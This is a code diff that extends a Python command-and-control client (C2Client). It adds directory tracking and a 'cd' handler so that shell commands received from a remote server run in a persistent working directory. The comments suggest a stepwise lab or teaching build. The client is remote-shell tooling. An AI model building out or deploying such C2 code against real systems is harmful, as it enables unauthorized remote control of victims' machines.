@@ -51,6 +51,7 @@ class C2Client:
         self.writer: Optional[asyncio.StreamWriter] = None
         self.running = True
         self.command_queue: asyncio.Queue = asyncio.Queue()
+        self.working_directory = os.getcwd()  # Track current working directory
         logger.info(f"C2 Client initialized (target: {server_host}:{server_port})")
 
     async def connect(self) -> bool:
@@ -123,6 +124,47 @@ class C2Client:
         logger.info(f"Executing echo command: {command}")
         return f"Echo: {command}"
 
+    async def execute_cd_command(self, target_dir: str) -> tuple[str, bool]:
+        """
+        Change working directory
+
+        Args:
+            target_dir: Target directory path
+
+        Returns:
+            Tuple of (output, success)
+        """
+        logger.info(f"Executing cd command: {target_dir}")
+
+        try:
+            # Handle special cases
+            if target_dir == "~":
+                target_dir = os.path.expanduser("~")
+            elif not target_dir:
+                target_dir = os.path.expanduser("~")
+
+            # Resolve path (absolute or relative to current working directory)
+            if os.path.isabs(target_dir):
+                new_path = os.path.abspath(target_dir)
+            else:
+                new_path = os.path.abspath(
+                    os.path.join(self.working_directory, target_dir)
+                )
+
+            # Verify directory exists
+            if not os.path.exists(new_path):
+                return f"cd: {target_dir}: No such file or directory", False
+
+            if not os.path.isdir(new_path):
+                return f"cd: {target_dir}: Not a directory", False
+
+            # Update working directory
+            self.working_directory = new_path
+            return f"Changed directory to {new_path}", True
+
+        except Exception as e:
+            return f"cd: {e}", False
+
     async def execute_bash_command(self, command: str) -> tuple[str, bool]:
         """
         Execute bash/shell command (Step 4)
@@ -139,13 +181,14 @@ class C2Client:
         logger.info(f"Executing bash command: {command}")
 
         try:
-            # Run command with timeout
+            # Run command with timeout in current working directory
             # shell=True allows bash-style commands but has security implications
             # In production, use proper command parsing and validation
             process = await asyncio.create_subprocess_shell(
                 command,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
+                cwd=self.working_directory,  # Use client's working directory
                 shell=True
             )
 
@@ -193,7 +236,14 @@ class C2Client:
                 result = await self.execute_echo_command(command)
 
             elif command_type == "bash":
-                result, success = await self.execute_bash_command(command)
+                # Check if command is 'cd' and handle specially
+                cmd_stripped = command.strip()
+                if cmd_stripped.startswith("cd ") or cmd_stripped == "cd":
+                    # Extract directory argument
+                    target_dir = cmd_stripped[2:].strip() if len(cmd_stripped) > 2 else ""
+                    result, success = await self.execute_cd_command(target_dir)
+                else:
+                    result, success = await self.execute_bash_command(command)
 
             elif command_type == "kill":
                 await self.execute_kill_command()
